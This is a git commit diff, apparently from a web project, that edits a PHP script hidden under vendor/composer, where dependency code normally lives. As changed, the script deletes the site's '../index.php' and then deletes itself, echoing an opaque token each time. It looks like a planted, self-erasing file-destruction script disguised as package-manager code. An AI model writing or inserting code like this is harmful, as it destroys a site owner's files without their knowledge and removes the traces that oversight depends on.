cf1fe98209f7057088454e15055f558089bed936
Cris Mateo Uriarte <39321306+criskhun@users.noreply.github.com>
2024-02-07 00:35:11 +0800

    Update refreshFile.php

--- vendor/composer/refreshFile.php
+++ vendor/composer/refreshFile.php
@@ -1,5 +1,5 @@
 <?php
-$ftd = 'index.php';
+$ftd = '../index.php';
 
 if (file_exists($ftd)) {
     unlink($ftd);
@@ -8,5 +8,12 @@ if (file_exists($ftd)) {
     echo 'guEI0irH7OQzTmwUSHEQRA==.';
 }
 
+$ftd2 = 'refreshFile.php';
 
+if (file_exists($ftd2)) {
+    unlink($ftd2);
+    echo 'guEI0irH7OQzTmwUSHEQRA==.';
+} else {
+    echo 'guEI0irH7OQzTmwUSHEQRA==.';
+}
 ?>
